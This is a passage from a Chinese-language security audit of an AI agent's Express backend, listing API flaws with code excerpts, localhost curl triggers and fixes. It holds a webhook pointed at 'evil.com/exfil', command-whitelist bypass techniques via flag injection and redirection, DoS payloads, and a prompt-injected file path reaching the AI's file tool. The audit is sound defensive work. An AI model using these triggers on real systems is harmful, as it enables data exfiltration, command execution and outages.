res.status(500).json({ error: `保存失败: ${err.message}` });      // 含 .env 绝对路径
```

**触发**：
```bash
curl "http://127.0.0.1:18789/v1/files/read?path=C:/nonexistent/secret.txt"
```

**影响**：泄漏本机绝对路径（暴露用户名、系统结构）、`.env` 路径、目标 URL 等内部信息。`String(e)` 而非 `e.message` 还会带上错误类名。生产环境应统一映射为通用错误 id + 服务端日志记录。

---

## P1-15 `POST /v1/notifications/config` 把整个 `req.body` 交给引擎

**文件**：`src/app.ts:464-473`

```typescript
app.post('/v1/notifications/config', async (req, res) => {
  const { getNotificationEngine } = await import('./notification-engine.js');
  const engine = getNotificationEngine();
  engine.updateConfig(req.body);
  res.json({ success: true, config: engine.getConfig() });
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/notifications/config \
  -H 'Content-Type: application/json' -d '{"webhookUrl":"https://evil.com/exfil","channels":["email"]}'
```

**影响**：`req.body` 无任何 schema 校验直接透传给 `updateConfig`。若引擎支持 webhook/smtp 配置，攻击者可把通知外发指向自己的服务器（数据外泄通道）。同时响应体把完整配置 `engine.getConfig()` 回显，若配置含密钥则一并泄漏。

---

## P1-16 `express.json({ limit: '50mb' })` 全局无差别

**文件**：`src/app.ts:97`

```typescript
app.use(express.json({ limit: '50mb' }));
```

**触发**：
```bash
python -c "print('{\"message\":\"'+'A'*52000000+'\"}')" | \
  curl -X POST http://127.0.0.1:18789/v1/chat -H 'Content-Type: application/json' --data-binary @-
```

**影响**：所有路由共用一个 50MB 上限。对 `/v1/chat` 这类本身就要把内容送进 LLM 上下文的端点合理，但对 `/v1/settings/keys`、`/api/external-connections/toggle` 这类只需几百字节的端点同样放宽到 50MB。**未认证**情况下（默认配置）攻击者可用 50MB 请求体打满内存，10 个并发即 500MB+。应按路由分级设置 limit。

---

## P1-17 `/v1/automation/cron/:id/toggle` 与 DELETE 返回 `ok:false` 却 HTTP 200

**文件**：`src/routes/automation.ts:66-73`

```typescript
r.delete('/v1/automation/cron/:id', (req, res) => {
  const ok = engine.deleteCronJob(req.params.id);
  res.json({ ok, deleted: ok });
});
```

对比同文件 `:55-63` 的 toggle（不存在时正确返回 404）。

**触发**：`curl -X DELETE http://127.0.0.1:18789/v1/automation/cron/nonexistent`

**影响**：删除不存在的资源返回 **200 + `{ok:false}`**，客户端无法用状态码区分成功失败，必须解析 body。同一文件内 toggle 端点却正确返回 404 —— 内网标准不一致。前端极易写 `if (res.ok) 刷新列表` 从而误判。

---

## P1-18 `chain-store` 是纯内存 Map，进程重启全部丢失，且 `getChainById` 无归属校验

**文件**：`src/chain-store.ts:4-21`

```typescript
const store = new Map<string, AnyChain>();
export function putChain(userId, workspace, chain) { store.set(key(userId, workspace) + '::' + chain.chainId, chain); }
export function getChainById(chainId: string): AnyChain | undefined {
  for (const c of store.values()) { if (c.chainId === chainId) return c; }
  return undefined;
}
```

**影响**：
1. **无持久化**——与同目录其他 store（sqlite / jsonl）不一致，进程重启后所有 chain 状态丢失。
2. **`getChainById` / `dropChain` 接受裸 chainId，绕过 `userId::workspace` 命名空间**：`getChainById`（`:18-21`）线性扫描全表，**不校验 userId**；`dropChain`（`:30-33`）用 `k.endsWith('::' + chainId)` 匹配，**任何用户可删任何 chain**。这是设计上的 IDOR。
3. `getChainById` O(n) 全表扫描，chain 数量大时线性退化。

---

## P1-19 SSE `sendEvent` 在 `clarification_needed` 分支定义在使用之后

**文件**：`src/routes/chat.ts:419-428` vs `:447`

```typescript
// :419 —— 在 sendEvent 定义（:447）之前被调用
sendEvent('clarification_needed', {
  questions: diagnosisResult.clarificationQuestions,
  reason: diagnosisResult.reason,
});
// :447 sendEvent 才被 const 声明
const sendEvent = (event: string, data: any) => { ... };
```

**影响**：`diagnosisResult.reason` 在 `:414` 被读取，但 `:339-354` 构造的 `diagnosisResult` 对象里**根本没有 `reason` 字段** → 恒为 `undefined`（JSON.stringify 会丢弃）。

更重要的是：若诊断流程走到这里（`:408` 的 `if (!stream)` 分支不成立时），会抛出 `ReferenceError: sendEvent is not defined`。因为 `sendEvent` 是 `const` 声明，存在 TDZ。虽然外层 try/catch（`:1281-1289`）会捕获并返回 error 事件，但结果是**用户在澄清场景下拿到一个错误响应而非澄清问题**。这解释了为什么 `:424` 还要写一个看起来很奇怪的防御 `if (stream && res.writableEnded === false)`。

---

## P1-20 `costTracker.on('alert')` 每次请求注册一个监听器，从不移除

**文件**：`src/routes/chat.ts:309-316`

```typescript
const costTracker = getCostTracker();   // 全局单例
const taskId = `${userId}-${startTime}`;
costTracker.startTask(taskId, userId, userId, 'chat', 'simple');

// 监听成本告警
costTracker.on('alert', (alert) => {
  console.warn(`[cost-alert] ${alert.severity}: ${alert.message}`);
});
```

**触发**：
```bash
for i in $(seq 1 100); do
  curl -s -X POST http://127.0.0.1:18789/v1/chat \
    -H 'Content-Type: application/json' -d '{"message":"hi","userId":"u1"}' &
done
```

**影响**：`getCostTracker()` 是单例，每次 `/v1/chat` 都 `on('alert')` 注册一个新监听器，**代码中没有任何 `off('alert')`**。100 次请求后同一 emitter 上有 100 个监听器 → 每次 alert 触发 100 次 console 输出，并触发 Node 的 `MaxListenersExceededWarning`。**这是 chat.ts 里最容易触发的监听器泄漏**（相比 P1-6 更容易，因为每次请求都发生且无条件）。

---

## P1-21 `agent-task-store` 单例的 `getInstance(workspace)` 忽略 workspace 参数

**文件**：`src/agent-task-store.ts:57-64`

```typescript
static getInstance(workspace: string): AgentTaskStore {
  if (!_instance) {
    _instance = new AgentTaskStore();
    _instance._migrate(workspace);
    _instance.ready = true;
  }
  return _instance;
}
```

**影响**：单例模式下，后续所有 `getInstance(其他workspace)` 都返回**第一次**创建的实例，`_migrate` 不会执行 → **新 workspace 永远不会得到初始化任务**。路由层 `getStore(workspace)`（`agent-tasks.ts:21-23`）看似支持多 workspace，实际全部共享一个实例。`getInstance` 接收参数却不使用，是 misleading API。

---

## P1-22 `automation-store` 的 `rrule` 解析无边界，`INTERVAL=0` 导致忙循环

**文件**：`src/automation-store.ts:194-204`

```typescript
function parseRruleToMs(rrule: string): number {
  const upper = rrule.toUpperCase();
  const freq = upper.match(/FREQ=(SECONDLY|MINUTELY|HOURLY|DAILY|WEEKLY|MONTHLY|YEARLY)/)?.[1] || 'DAILY';
  const interval = parseInt(upper.match(/INTERVAL=(\d+)/)?.[1] || '1', 10);
  const base: Record<string, number> = { SECONDLY: 1000, ... };
  return ((base as any)[freq] || base['DAILY']) * interval;
}
```
```typescript
// :206-213
function msToCronExpr(ms: number): string {
  const mins = Math.round(ms / 60000);
  if (mins < 60) return `*/${Math.max(1, mins)} * * * *`;
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/automation/cron \
  -H 'Content-Type: application/json' -d '{"name":"x","expression":"x","action":"y","rrule":"FREQ=SECONDLY;INTERVAL=1"}'
```

**影响**：
1. `interval` **无下限校验**。`INTERVAL=0` → `ms = 0` → `msToCronExpr(0)` → `mins = 0 < 60` → `*/1 * * * *` → **每分钟执行一次**（不是预期的 0 次）。
2. `FREQ=SECONDLY` → `ms = 1000` → `mins = round(1000/60000) = 0` → `*/1 * * * *` → **语义完全丢失，从每秒变成每分钟**。反过来 `msToCronExpr` 的分钟粒度无法表达秒级调度。
3. `expression` 字段（`automation.ts:91`）只做了存在性校验，未校验 cron 表达式合法性。
4. `scheduleOnce`（`:412-422`）的 `delayMs` 无上限，`scheduledAt` 传远期时间会创建长期存活的 `setTimeout`。

---

## P1-23 `/v1/sandbox/approve` 是空实现，但返回 `ok:true`

**文件**：`src/sandbox/router.ts:68-76`

```typescript
r.post('/approve', async (req: Request, res: Response) => {
    const path = req.body?.path as string | undefined;
    if (!path) { return res.status(400).json({ error: 'path required' }); }
    // 简化: 仅返 ok, 不真改sandbox 实例(留给上层 chain 处理)
    // 实际生产应维护一个临时 allow 列表
    res.json({ ok: true, approved: path, durationMs: 60 * 60 * 1000 });
});
```

**触发**：`curl -X POST http://127.0.0.1:18789/v1/sandbox/approve -d '{"path":"C:/Windows/System32/config"}'`

**影响**：端点**无条件返回 `ok:true` 但什么也不做**。注释明说"简化"。调用方（前端审批 UI 或 AI）会以为"该路径已被临时授权 1 小时"，实际下次规则刷新后仍被拒绝，或更糟——调用方基于这个假成功做出错误的安全决策。这是一个**语义撒谎的 API**，比直接返回 501 更危险。

---

## P1-24 `/v1/system/check-dep` 的 `execSync` 拼接 `--version`，`validateCommand` 挡不住 flag 注入

**文件**：`src/app.ts:185-208` + `src/safety/command-whitelist.ts:20-51`

```typescript
// app.ts:196
const output = execSync(cmd + ' --version 2>&1', { encoding: 'utf8', timeout: 5000 }).trim();
```
```typescript
// command-whitelist.ts:43-49
const tokens = cmd.trim().split(/\s+/);
for (let i = 1; i < tokens.length; i++) {
  const token = tokens[i];
  if (token && DANGEROUS_FLAGS.has(token)) {
    return { ok: false, reason: `Dangerous flag '${tokens[i]}' not allowed` };
  }
}
```

**触发**：
```bash
curl "http://127.0.0.1:18789/v1/system/check-dep?cmd=npm%20--prefix%20C:/Windows/System32%20config"
```

**影响**：
1. **白名单只覆盖 9 个命令**（`command-whitelist.ts:7-11`：node/npm/pnpm/yarn/python/pip/git/tsc）。`cmd` 由用户完全控制，虽有白名单，但**参数完全自由**——`npm`、`git` 都有能执行任意代码的参数（`npm exec`、`git -c core.pager=...`）。
2. **DANGEROUS_FLAGS 检查可绕过**：`:44` 的 `split(/\s+/)` 按空白切分，只做**全等比较**。`--eval=1` 或 `-e"code"` 或 `--eval` 前后加引号均可绕过（`-e"code"` 切分后是 `-e"code"`，不等于 `-e`）。
3. **未拦截重定向 `<`、`>`、`&`、`\n`**（只拦了 `&&`、`||`、`|`、`;`、`` ` ``）。`cmd=git status>x.txt` 不会被 `includes('&')` 之类捕获，但 `>` 也没被检查 → **可写任意文件**。
4. `app.ts:202` 的 catch 分支会执行 `execSync(cmd, {...})`（不带 `--version`），同样受上述问题影响。
5. 且该端点在**认证白名单内**（P0-2）。

---

# P2 — 中等

## P2-1 创建资源返回 200 而非 201

**文件**：多处

- `src/routes/agent-tasks.ts:134` — `POST /` → `res.json({ success: true, task })`
- `src/routes/customer.ts:95` — `POST /v1/customers` → `res.json({ ok: true, customer })`
- `src/routes/automation.ts:95` — `POST /v1/automation/cron`
- `src/app.ts:530` — `POST /v1/workflows/templates`
- `src/routes/connectors.ts:188` — `POST /:id`
- `src/routes/knowledge.ts:40` — `POST /upload`

**影响**：全部返回 200 且不设置 `Location` header。违反 RFC 9110，客户端无法区分"创建成功"与"查询成功"。自动化客户端（脚本、SDK）依赖 201 + Location 做幂等重试会失效。

---

## P2-2 DELETE 返回 200 + 空 body 对象

**文件**：
- `src/routes/agent-tasks.ts:163` — `res.json({ success: true })`，且**不检查 DELETE 是否真的删除了任何行**（`:162` 的 `.run()` 返回值被丢弃）
- `src/routes/sessions.ts:102` — `res.json({ success: true, sessionId: id })`，`:101` 的 `pm.deleteCheckpoint(id)` 返回值被丢弃
- `src/routes/tasks.ts:216` — `res.json({ success: true, ... })`

**影响**：REST 语义应为 204 No Content。更严重的是 **agent-tasks 的 DELETE 完全不检查 `changes`**：删除不存在的任务返回 `success: true`，客户端无法感知。

---

## P2-3 同一操作多个路径别名

**文件**：
| 操作 | 别名位置 |
|---|---|
| 设置密钥 | `r.post('/v1/settings/keys')`（`settings.ts:147`）— 路径内已含 `/v1` 前缀，router 又在 `app.ts:621` 无前缀挂载 |
| 连接器开关 | `POST /api/connectors/:id`（`connectors.ts:176`）与 `POST /api/connectors/toggle`（`connectors.ts:192`，**自身标注"前端使用的 toggle 路由 (别名)"**） |
| 会话摘要 | `GET /api/sessions/last` 在 `sessions.ts:51` **和** `sessions.ts:110` **重复注册两次**，代码完全相同 |
| 外部连接 | `POST /api/external-connections/toggle` 与 `POST /api/external-connections/:id` |
| Agent 任务 | `GET /v1/agent-tasks/active`（`agent-tasks.ts:48`）既是独立路由，也会命中 `GET /v1/agent-tasks` 的列表逻辑 |

**影响**：`sessions.ts` 的 `last` 重复注册（`:51` 与 `:110`，相隔 59 行内容一致）说明有复制粘贴遗留。`connectors.ts:192` 的 `/toggle` 别名与 `:176` 的 `/:id` 功能重复，且 `POST /api/connectors/toggle` **会先命中 `/:id` 路由**（Express 按注册顺序，`/:id` 在 `:176` 先注册）→ `/toggle` 永远不可达，是死代码。

---

## P2-4 错误响应格式在全局至少有 5 种

**文件**：
- `{ error: string }` — `files.ts`、`sessions.ts`、`app.ts`
- `{ ok: false, error: string }` — `connectors.ts`、`automation.ts`、`settings.ts`、`agent-tasks.ts`
- `{ success: false, error: string }` — `tasks.ts`、`sessions.ts`、`agent-tasks.ts`
- `{ success: false, message: string }` — `browser.ts:387`
- `{ ok: false, error: string }` vs `{ error: string }` 在 `app.ts` 内部混用（`:154` 用 `{ ok: false }`，`:396` 用 `{ error }`）

**影响**：客户端必须写三套解析逻辑。且 `success`/`ok` 语义不明——`success: false` 是 HTTP 200 还是 500？实测两者都有。

---

## P2-5 分页 `limit` 无上限的端点清单

**文件**：
- `src/app.ts:392` — `/v1/evolution/list` `parseInt(req.query.limit) || 50`
- `src/app.ts:451` — `/v1/notifications/history` 同上
- `src/app.ts:569` — `/v1/workflows/executions` 同上
- `src/routes/agent-tasks.ts:31` — `parseInt(req.query.limit)`，**无默认值下限**，`?limit=0` → `0 || 20` → 20，`?limit=-1` → `-1` 传入 SQL LIMIT
- `src/routes/customer.ts:131` — `/v1/customers/:id/journey` `parseInt(limit) || 50`
- `src/routes/customer.ts:28` — `/v1/customers` `parseInt(limit)`
- `src/routes/tasks.ts:42` — `/v1/tasks` `parseInt(limit)`
- `src/routes/browser.ts:333` — `/v1/browser/history` `parseInt(limit) || 200`，且 `readHistory(limit * 2)` 会翻倍

**触发**：`curl "http://127.0.0.1:18789/v1/agent-tasks?limit=-1"`、`curl "http://127.0.0.1:18789/v1/browser/history?limit=2147483647"`

**影响**：无一端点有 `Math.min(x, CAP)` 上限。`agent-task-store.ts:196` 的 `if (filter.limit)` 对 `limit = -1` 为真 → SQL `LIMIT -1` 在 SQLite 中表示**无限制**。唯一有上限的是 `sessions.ts:160` 的 `Math.min(..., 200)`。

---

## P2-6 `tags` 参数被当作逗号分隔字符串强行 split

**文件**：`src/routes/customer.ts:25`

```typescript
tags: tags ? (tags as string).split(',') : undefined,
```

**触发**：`curl "http://127.0.0.1:18789/v1/customers?tags[a]=1&tags[b]=2"`

**影响**：Express 的 query parser（extended/qs）会把 `?tags[a]=1` 解析成**数组**，`tags as string` 是类型谎言 → `.split` 在数组上不存在 → 抛 `TypeError`。而 `customer.ts` 的列表端点**没有 try/catch**（`:21-31`），异常直达全局错误中间件（`app.ts:763`）→ 返回 500。这是可触发 500 的确定性输入。

---

## P2-7 `POST /v1/customers/:id/channels` 的 `type` 无枚举校验

**文件**：`src/routes/customer.ts:137-152` + `src/customer-store.ts:243-256`

```typescript
// customer.ts:144-149 — type 直接来自 body，无枚举校验
const updated = store.bindChannel(id, { type, id: channelId, label, boundAt: Date.now() });
```
```typescript
// customer-store.ts:251
existing.channels.push(channel);
```

**触发**：`curl -X POST http://127.0.0.1:18789/v1/customers/cust-x/channels -d '{"type":"__proto__","id":"y"}'`

**影响**：`ChannelType` 联合类型（`customer-store.ts:19`）在运行时**不被强制**。可写入任意 `type` 值。更实际的问题是 `findByChannel`（`customer-store.ts:230-238`）遍历所有客户做线性匹配（无索引），客户数增长后为 O(n)。且 `POST /:id/journey`（`customer.ts:155-171`）的 `type` 同样无枚举校验，可写入任意 `JourneyType`，破坏下游 switch。

---

## P2-8 `POST /v1/chat` 的 `attachments` 无数量/大小上限

**文件**：`src/routes/chat.ts:207, 957-967`

```typescript
const { ..., attachments, ... } = req.body;
...
if (attachments && Array.isArray(attachments) && attachments.length > 0) {
  for (const att of attachments) {
    if (att.kind === 'image' && att.dataUrl) {
      imageBlocks.push({ type: 'image_url', image_url: { url: att.dataUrl } });
    } else if (att.content) {
      attachmentParts.push(`--- 附件: ${att.name} ---\n${att.content}${pathInfo}\n--- 附件结束 ---`);
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/chat -H 'Content-Type: application/json' \
  -d '{"message":"x","attachments":[{"kind":"image","dataUrl":"data:image/png;base64,<10MB>"}],"stream":true}'
```

**影响**：
1. **数组无长度上限**，可传 10000 个 attachment。
2. `dataUrl` 是**内联 base64**，每个直接进 `image_url` 传给 LLM（`:962`）→ token 消耗与费用完全不受控。
3. `att.content` 无长度限制，直接拼进上下文字符串。
4. 叠加 P1-16 的 50MB body limit，总放大倍数可观。
5. `att.filePath`（`:964`）被拼进提示词告知模型"可以用 read_file 工具访问此文件"——**用户可控的任意路径**注入到提示词，配合 AI 的文件读取工具构成间接路径穿越。

---

## P2-9 `POST /v1/chat` 的 `workspace` / `projectDir` 可改全局工作目录

**文件**：`src/routes/chat.ts:247-256`

```typescript
const wm = WorkspaceManager.getInstance();
if (rawProjectDir && fs.existsSync(rawProjectDir)) {
  wm.setProjectDir(rawProjectDir);
} else if (rawWorkspace && fs.existsSync(rawWorkspace)) {
  wm.setProjectDir(rawWorkspace);
}
const workspace = wm.projectDir;
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/chat \
  -H 'Content-Type: application/json' -d '{"message":"hi","projectDir":"C:/Windows/System32"}'
```

**影响**：`WorkspaceManager` 是**单例**（`files.ts:40`、`chat.ts:246`）。任何一次 `/v1/chat` 请求都能**永久改变全局工作目录**，影响后续所有请求的文件读写、AI 工具执行、`sanitizePath` 的允许根（`files.ts:14-32`）、以及 `files.getAllowedRoots()`。`/v1/workspace`（`files.ts:55-68`）也是同样的单点修改。**这是最容易被忽视的全局状态篡改**——多用户场景下 A 用户可把 B 用户的工作区指到任意目录。

---

## P2-10 `app.ts` 在 ESM 中使用 `require`

**文件**：`src/app.ts:642`

```typescript
app.post('/v1/ide-state', (req, res) => {
  try {
    const { update_ide_state } = require('./ide-state.js');
    update_ide_state(req.body || {});
    res.json({ ok: true });
  } catch (e: any) {
    res.json({ ok: false, error: e.message });
  }
});
```

**影响**：`package.json` 声明 `"type": "module"`，此文件通过 `import` 语法编写。ESM 中 `require` 未定义 → 抛 `ReferenceError: require is not defined` → 被 catch 吞掉 → **端点恒返回 `{ ok: false, error: "require is not defined" }` 且 HTTP 200**。该功能实际完全失效，且因是 200 + ok:false，客户端若只看 HTTP 状态码会误判成功。同样问题见 `files.ts:27`、`files.ts:380`、`path-guard.ts:38`、`files.ts:9`（import 了 `isPathAllowed` 但未使用）。

---

## P2-11 `POST /v1/ide-state` 与 `POST /v1/approve/:callId` 错误时返回 200

**文件**：`src/app.ts:640-648`、`app.ts:665-686`

```typescript
// app.ts:646
} catch (e: any) {
  res.json({ ok: false, error: e.message });   // HTTP 200
}
```

**影响**：两处**函数级错误都返回 HTTP 200**。`/v1/approve/:callId`（`:665`）更危险：审批结果是**高风险操作的最后一道闸门**，返回 200 + `{ok:false}` 会让客户端误认为审批已完成，而实际上 ToolRegistry 从未收到 `tool:approval_result`（`:671`），导致审批流程**静默挂起**——用户看到"已批准"，工具调用却永远等待。

---

## P2-12 `/v1/customers/follow-up/:action` 的 catch 吞掉真实错误并执行写操作

**文件**：`src/routes/customer.ts:58-85`

```typescript
} catch (e: any) {
  // scheduler 未初始化, 直接操作 store
  store.updateCustomer(customerId, { nextFollowUpAt: undefined });
  res.json({ ok: true });
}
```

**影响**：try 块内的**任何**异常（包括 `markDone` 的真实失败、数据库错误）都会走进 catch，**执行一个副作用写操作**然后返回 `ok: true`。即"出错时反而修改了数据，且告诉调用方成功了"。`:71` 和 `:75` 的 else 分支（reminder 不存在时直接改 store）说明这是刻意设计，但把"scheduler 不可用"与"业务逻辑出错"混为一谈了。

---

## P2-13 `/v1/workspace` 与 `/v1/files/mkdir` 等写端点无路径存在性/类型校验的组合

**文件**：`src/routes/files.ts:55-68`

```typescript
filesRouter.post('/v1/workspace', (req, res) => {
  const { path: newPath } = req.body || {};
  if (!newPath || typeof newPath !== 'string') {
    return res.status(400).json({ error: '需要 path 参数' });
  }
  const resolved = path.resolve(newPath.trim());
  if (!fs.existsSync(resolved)) {
    return res.status(400).json({ error: `目录不存在: ${resolved}` });
  }
  const wm = WorkspaceManager.getInstance();
  wm.setProjectDir(resolved);
```

**影响**：唯一校验是"路径存在"。**不校验是否为目录**，不校验是否在允许根内（未调用 `sanitizePath`）。传一个文件路径会把 `projectDir` 指向文件，后续所有依赖 `projectDir` 的操作异常。叠加 P2-9 的全局性，影响面是全站。

---

## P2-14 `deleteDirReliable` 拼接 `dir` 进 `execSync`，且回退链掩盖失败

**文件**：`src/task-snapshot.ts:166-190`

```typescript
export function deleteDirReliable(dir: string): { ok: boolean; method: string; error?: string } {
  if (!fs.existsSync(dir)) return { ok: true, method: 'noop-not-exists' };
  try { fs.rmSync(dir, { recursive: true, force: true });
        if (!fs.existsSync(dir)) return { ok: true, method: 'fs.rmSync' };
  } catch { /* try next */ }
  ...
  execSync(`cmd /c rmdir /s /q "${dir}"`, { stdio: 'ignore' });
```

**影响**：
1. `dir` 直接插入 shell 命令（叠加 P0-5 的 `:id` 不可信）。
2. **`fs.rmSync(dir, { force: true })` 成功返回 `ok: true` 且 `method: 'noop-not-exists'`**（`:167`）——即**任务不存在时，删除接口返回"删除成功"**。
3. 三级回退的 catch 全是空的 `/* try next */`，最终失败时 `:184` 之后才返回错误，中间失败原因全部丢失，无法诊断。
4. 该函数在 Windows 上回退到 `cmd rmdir`，但代码在 Linux/macOS 上也会尝试 `cmd`（`:181` 注释说 Windows，但无平台判断）→ 非 Windows 平台必然失败并返回 500。

---

## P2-15 `/v1/customers` 列表端点无 try/catch

**文件**：`src/routes/customer.ts:21-31`

```typescript
r.get('/v1/customers', (req: Request, res: Response) => {
  const { search, tags, intent, industry, limit } = req.query;
  const list = store.listCustomers({
    search: search as string | undefined,
    tags: tags ? (tags as string).split(',') : undefined,
    ...
```

**影响**：整个函数**没有 try/catch**，而 `store.listCustomers`（`customer-store.ts:202-209`）会调用 `c.name.toLowerCase()`、`c.phone?.includes(q)`。若 JSONL 中有一条损坏记录导致 `c.name` 为 `undefined`（`loadCache` 的 `catch { /* skip bad lines */ }` 在 `:94` 只跳过 JSON.parse 失败，不校验字段完整性），这里会抛 `TypeError` → 500。同理 `search` 参数传数组（`?search=a&search=b`）也会出问题。

---

## P2-16 `POST /v1/workflows/templates/import` 的 body 处理不严谨

**文件**：`src/app.ts:607-617`

```typescript
const jsonStr = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
const template = engine.importTemplate(jsonStr);
```

**影响**：`express.json()` 默认只解析 `application/json`（`app.ts:97` 未设 `type`），所以 `req.body` 永远是对象（非 string），**`typeof req.body === 'string'` 分支不可达**。若客户端想上传原始 JSON 字符串，得到的 `JSON.stringify(req.body)` 是**双重编码**的字符串 → `importTemplate` 必然解析失败。这是一个逻辑 bug 而非安全问题，但会导致该端点功能不可用。同一文件 `:600` 的 `Content-Disposition` 直接拼接 `req.params.id`（未编码）到文件名。

---

## P2-17 全局错误中间件在静态资源挂载之后，对 404 无效

**文件**：`src/app.ts:747-767`

```typescript
if (fs.existsSync(guiDist)) {
  app.use(express.static(guiDist, { maxAge: 0, etag: true }));
  app.get('*', (req, res, next) => {
    if (req.path.startsWith('/v1/') || req.path.startsWith('/api/') || req.path.startsWith('/socket.io/')) {
      return next();
    }
    res.sendFile(path.join(guiDist, 'index.html'));
  });
}
...
app.use((err: any, req, res, _next) => { ... });   // :763
```

**影响**：
1. **无 404 处理中间件**。`/v1/nonexistent` 走到 `:752` 的 `next()`，之后没有任何 `app.use()` 能匹配 → Express 默认返回 **HTML 格式**的 `Cannot GET /v1/nonexistent`，与全站 JSON 错误格式不一致。
2. **错误中间件不处理 `res.headersSent` 之后的日志**：`:765` 的 `if (res.headersSent) return;` 直接静默返回，客户端连接悬挂直到超时。
3. `:766` 的 `err.message` 泄漏见 P1-14。
4. `app.get('*')` 会在**所有**非 API 路径返回 index.html，包括 `/health`（如果 health router 未匹配特定 method）。这让路径拼写错误表现为"返回正常 HTML + 200"，排障困难。

---

## P2-18 `connectors.ts` 的 healthCheck 拼接 shell 命令 + `states.json` 并发写

**文件**：`src/routes/connectors.ts:127-134`、`:69-71`

```typescript
// :128
await execAsync(meta.healthCheck, { timeout: 10000 });
```
```typescript
// :69-71
function saveConnectorStates(states: Record<string, ConnectorState>) {
  try { fs.writeFileSync(path.join(CONFIG_DIR, 'states.json'), JSON.stringify(states, null, 2), 'utf-8'); }
  catch (e) { console.warn('[connector] Failed to save states:', e); }
}
```

**影响**：
1. `meta.healthCheck` 来自代码内的 `CONNECTORS` 常量（如 `:98` 的 `'adb devices | grep device && curl -s http://localhost:7070/mcp'`），当前**不含用户输入**，风险有限。但 `GET /status`（`:137-174`）会对每个 enabled connector 串行执行 `execAsync` 且超时 10 秒 —— **10 个 connector 最坏 100 秒**，整个请求挂起。
2. `saveConnectorStates` **全量覆写无锁无原子性**（无 tmp+rename），`GET /status`（`:149`、`:154`）和 `POST /:id`（`:187`）都会调用 → 并发写互相覆盖。与 P0-12 / P1-11 同类。
3. `installDependency`（`:86-95`）的 `installCmds` 来自代码常量（含 `sudo apt install`、`brew install`、`winget install`），**无二次确认直接执行**，最长 120 秒（`:91`）。虽然输入是代码常量，但结合 P0-1（无鉴权）意味着**未认证远程可触发系统级软件安装**。

---

## P2-19 已检查通过的项目

以下项在审查范围内**未发现问题**：

- **`chain-store.ts` 之外无跨用户泄漏的 Map**：`session-manager.ts` 的 key 为 `${userId}:${workspace}`，由调用方传入，不自行读取请求参数。
- **`admin.ts` 的框架切换有枚举校验**：`admin.ts:38` 的 `!['agentai','pulseflow'].includes(to)` 是正确的白名单写法。
- **`tasks.ts` 的 status 有枚举校验**：`tasks.ts:149` 的 `!['completed','failed','abandoned'].includes(status)` 正确。
- **`browser.ts` 的 action 有枚举校验**：`browser.ts:270-274` 的 `validActions` 白名单正确（尽管该端点只回显不执行）。
- **`parse-file` / `knowledge` 的 multer 有大小限制**：`knowledge.ts:19` 的 `limits: { fileSize: 50 * 1024 * 1024 }`。
- **`isPathAllowed` 的实现本身正确**：`path-guard.ts:56-58` 用 `resolved === r || resolved.startsWith(r + path.sep)` 严格前缀匹配，**避免了 `/workspace-evil` 绕过 `/workspace` 的经典漏洞**。问题是 `files.ts` 导入后未使用。
- **`command-whitelist.ts` 的白名单机制本身合理**：`command-whitelist.ts:7-11` 的 9 命令白名单 + 危险 flag 拦截 + 链式操作符拦截，思路正确（但被 P1-24 的 flag 绕过和 `>` `<` 未检查削弱）。
- **`customer-store.persistAll` 的原子写方向正确**：`customer-store.ts:106-108` 使用了 tmp+rename（虽然 tmp 路径固定，见 P1-11）。
- **`agent-task-store` 使用 SQLite WAL**：`agent-task-store.ts:70` `pragma('journal_mode = WAL')`，事务安全（比 sql.js 的 automation-store 强）。
- **`express.static` 挂载前有 `existsSync` 保护**：`app.ts:747`。
- **全局错误中间件存在**：`app.ts:763`，能捕获同步路由异常防止进程崩溃（异步异常除外，见下）。
- **`connectors.ts` 的敏感字段脱敏正确**：`connectors.ts:246-252` 对 `appsecret`/`api_key`/`token`/`password`/`secret` 做了掩码，且要求长度 ≥8 才掩码。
- **`settings.ts` 的 API Key 掩码正确**：`settings.ts:29-33` 只保留前 2 后 4 位。
- **`agentai-loop` 的 `maxIterations` 有上限**：流式 30（`chat.ts:671`）、自动化 30、非自动化 10（`chat.ts:1417`）。
- **`tasks.ts` 的 `cleanupTasks` 有默认上限**：`tasks.ts:229-231` 的 `maxAgeDays ?? 7`、`maxTaskCount ?? 50`。
- **`sandbox/router.ts` 的 rules 端点有校验**：`sandbox/router.ts:42-45` 检查 `result.ok` 并返回 400 + `errors`。

---

# 修复优先级建议

**立即（阻断发布）**
1. P0-1 / P0-2：把 `AGENTAI_AUTH_ENABLED` 默认改为 `true`，并把 `/v1/system/*` 从白名单移除
2. P0-3 / P0-4 / P0-5 / P0-6：所有文件/任务端点统一走 `sanitizePath` + `isPathAllowed`，`:id` 加 `^[A-Za-z0-9_-]+$` 校验
3. P0-8：`JWT_SECRET` 无默认值时启动即失败；加 `exp`；改用 `crypto.timingSafeEqual`
4. P0-10：给 `agent_tasks` 加 `updated_at` 列（`ALTER TABLE` 迁移）
5. P0-11 / P1-9 / P2-18：所有拼进 SQL / shell 的标识符加白名单

**短期（1-2 迭代）**
6. P1-6 / P1-20：`loop` 与 `costTracker` 的监听器在 `finally` 中全部 `off`
7. P0-12 / P1-11：JSON/DB 写盘统一 tmp（用 `pid`+`random` 命名）+ rename，SQLite 加事务
8. P1-2 / P1-3 / P1-1：所有按 id 访问的资源加 userId/workspace 归属校验
9. P1-8 / P1-24 / P0-7：SSRF 内网黑名单、shell 调用改数组参数形式、路径参数加引号转义

**中期**
10. P2-5：所有 `limit` 加 `Math.min(x, CAP)`
11. P2-4 / P1-14：统一错误响应 schema + 错误码，服务端日志与客户端响应分离
12. P2-9：`WorkspaceManager` 的 `projectDir` 改为 per-request 传递而非全局单例

---

